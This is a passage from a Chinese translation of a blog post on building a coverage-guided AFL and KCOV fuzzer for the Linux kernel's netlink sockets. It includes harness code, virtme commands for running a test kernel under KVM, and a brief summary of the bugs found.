class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="从AFL读取测试数据"><a href="#从AFL读取测试数据" class="headerlink" title="从AFL读取测试数据"></a>从AFL读取测试数据</h2><p>最后，我们需要实际编写核心netlink接口的测试代码！首先，我们需要从AFL读取输入数据。默认情况下，AFL将测试用例发送到stdin：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* read AFL test data */</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf_len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Fuzzing-netlink"><a href="#Fuzzing-netlink" class="headerlink" title="Fuzzing netlink"></a>Fuzzing netlink</h2><p>然后我们需要将此缓冲区发送到netlink套接字。但我们对netlink的工作原理一无所知！好吧，让我们使用前5个字节的输入作为netlink协议和组ID字段。这将允许AFL找出并猜测这些字段的正确值。代码测试netlink（简化）：</p><pre class="line-numbers language-c"><code class="language-c">netlink_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_NETLINK<span class="token punctuation">,</span> SOCK_RAW <span class="token operator">|</span> SOCK_NONBLOCK<span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> sockaddr_nl sa <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span>nl_family <span class="token operator">=</span> AF_NETLINK<span class="token punctuation">,</span>        <span class="token punctuation">.</span>nl_groups <span class="token operator">=</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">bind</span><span class="token punctuation">(</span>netlink_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>sa<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sa<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> iovec iov <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf_len <span class="token operator">-</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> sockaddr_nl sax <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token punctuation">.</span>nl_family <span class="token operator">=</span> AF_NETLINK<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> msghdr msg <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">&amp;</span>sax<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sax<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>r <span class="token operator">=</span> <span class="token function">sendmsg</span><span class="token punctuation">(</span>netlink_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* sendmsg succeeded! great I guess... */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本上就是这样！为了速度，我们将它包装在一个模仿<a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html" target="_blank" rel="noopener">AFL“fork服务器”逻辑</a>的短循环中。我将跳过此处的解释，<a href="https://github.com/cloudflare/cloudflare-blog/blob/master/2019-07-kernel-fuzzing/src/forksrv.c" target="_blank" rel="noopener">请参阅我们的代码了解详细信息</a>。我们的AFL-to-KCOV垫片的结果代码如下所示：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">forksrv_welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">forksrv_cycle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    test_data <span class="token operator">=</span> <span class="token function">afl_read_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kcov_enable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* netlink magic */</span>    <span class="token function">kcov_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* fill in shared_map with tuples recorded by kcov */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_crash_in_dmesg<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">forksrv_status</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token function">forksrv_status</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/cloudflare/cloudflare-blog/blob/master/2019-07-kernel-fuzzing/src/fuzznetlink.c" target="_blank" rel="noopener">查看完整的源代码</a>。</p><h2 id="如何运行自定义内核"><a href="#如何运行自定义内核" class="headerlink" title="如何运行自定义内核"></a>如何运行自定义内核</h2><p>我们遗漏了一个重要的部分 - 如何实际运行我们构建的自定义内核。有三种选择：</p><p><strong>“native”</strong>：您可以在服务器上完全启动构建的内核并在本机模糊它。这是最快的技术，但很有问题。如果模糊测试成功找到错误，您将崩溃机器，可能会丢失测试数据。应该避免切割我们坐的树枝。</p><p><strong>“uml”</strong>：我们可以将内核配置为以<a href="http://user-mode-linux.sourceforge.net/" target="_blank" rel="noopener">用户模式Linux运行</a>。运行UML内核不需要任何权限。内核只运行用户空间进程。UML非常酷，但遗憾的是，它不支持KASAN，因此减少了查找内存损坏错误的可能性。最后，UML是一个非常神奇的特殊环境 - 在UML中发现的错误可能与真实环境无关。有趣的是，<a href="https://source.android.com/devices/architecture/kernel/network_tests" target="_blank" rel="noopener">Android network_tests框架</a>使用UML 。</p><p><strong>“kvm”</strong>：我们可以使用kvm在虚拟化环境中运行我们的自定义内核。这就是我们要做的。</p><p>在KVM环境中运行自定义内核的最简单方法之一是使用<a href="https://github.com/amluto/virtme" target="_blank" rel="noopener">“virtme”脚本</a>。有了它们，我们可以避免创建专用的磁盘映像或分区，只需共享主机文件系统。这就是我们运行代码的方式：</p><pre class="line-numbers language-sh"><code class="language-sh">virtme-run \    --kimg bzImage \    --rw --pwd --memory 512M \    --script-sh "<what to run inside kvm>" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></what></code></pre><p>但坚持下去。我们忘记了为我们的模糊器准备输入语料库数据！</p><h2 id="构建输入语料库"><a href="#构建输入语料库" class="headerlink" title="构建输入语料库"></a>构建输入语料库</h2><p>每个模糊器都需要精心设计的测试用例作为输入，以引导第一个突变。测试用例应该简短，并尽可能覆盖大部分代码。可悲的是 - 我对netlink一无所知。我们怎么不准备输入语料库…</p><p>相反，我们可以要求AFL“弄清楚”哪些输入有意义。这就是<a href="https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html" target="_blank" rel="noopener">Michał在2014年用JPEG</a>制作的，并且对他<a href="https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html" target="_blank" rel="noopener">有用</a>。考虑到这一点，这是我们的输入语料库：</p><pre class="line-numbers language-sh"><code class="language-sh">mkdir inpecho "hello world" > inp/01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有关如何编译和运行整个事情的说明都在我们的github上的<a href="https://github.com/cloudflare/cloudflare-blog/blob/master/2019-07-kernel-fuzzing" target="_blank" rel="noopener">README.md中</a>。归结为：</p><pre class="line-numbers language-sh"><code class="language-sh">virtme-run \    --kimg bzImage \    --rw --pwd --memory 512M \    --script-sh "./afl-fuzz -i inp -o out -- fuzznetlink" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过此运行，您将看到熟悉的AFL状态截图：</p><p><img src="http://q85n97zux.bkt.clouddn.com/1.png" alt></p><h2 id="研究总结"><a href="#研究总结" class="headerlink" title="研究总结"></a>研究总结</h2><p>而已。现在你有了一个自定义的强化内核，运行一个基本的覆盖引导模糊器。所有KVM内部。</p><p>值得努力吗？即使有这个基本的模糊器，也没有输入语料库，一两天后，<a href="https://lore.kernel.org/netdev/CAJPywTJWQ9ACrp0naDn0gikU4P5-xGcGrZ6ZOKUeeC3S-k9+MA@mail.gmail.com/T/#u" target="_blank" rel="noopener">模糊</a>器发现了一个有趣的代码路径：<a href="https://lore.kernel.org/netdev/CAJPywTJWQ9ACrp0naDn0gikU4P5-xGcGrZ6ZOKUeeC3S-k9+MA@mail.gmail.com/T/#u" target="_blank" rel="noopener">NEIGH：BUG，双定时器添加，状态为8</a>。使用更专业的模糊器，一些改进“稳定性”度量和一个体面的输入语料库，我们可以期待更好的结果。</p><p>如果您想了解更多关于netlink套接字实际执行的内容，请参阅我的同事Jakub Sitnicki <a href="http://codecave.cc/multipath-routing-in-linux-part-1.html" target="_blank" rel="noopener">在Linux中的多路径路由</a>的博客文章<a href="http://codecave.cc/multipath-routing-in-linux-part-1.html" target="_blank" rel="noopener">- 第1部分</a>。然后在<a href="https://books.google.pl/books?redir_esc=y&hl=pl&id=96V4AgAAQBAJ&q=netlink#v=snippet&q=netlink&f=false" target="_blank" rel="noopener">Rami Rosen的Linux内核网络书中</a>有一篇很好的章节。</p><p>在这篇博文中我们没有提到：</p><ul><li>AFL shared_memory设置的详细信息</li><li>执行AFL持久模式</li><li>如何创建一个网络命名空间来隔离怪异的netlink命令的效果，并提高AFL得分的“稳定性”</li><li>关于如何读取dmesg（/ dev / kmsg）以查找内核崩溃的技巧</li><li>想要在KVM之外运行AFL，以获得速度和稳定性 - 目前在发现崩溃后测试不稳定</li></ul><p>但是我们实现了我们的目标 - 我们针对内核建立了一个基本但仍然有用的模糊器。最重要的是：可以重复使用相同的机制来模糊Linux子系统的其他部分 - 从文件系统到bpf验证程序。</p><p>我还学到了一个艰难的教训：调整模糊器是一项全职工作。正确的模糊测试绝对不是像启动它并无所事事地等待崩溃一样简单。总有一些东西需要改进，调整和重新实现。Mateusz Jurczyk在上述演讲开头的一句话引起了我的共鸣：</p><blockquote><p>“模糊很容易学，但很难掌握。”</p></blockquote><p>快乐虫狩猎！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> Vul </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
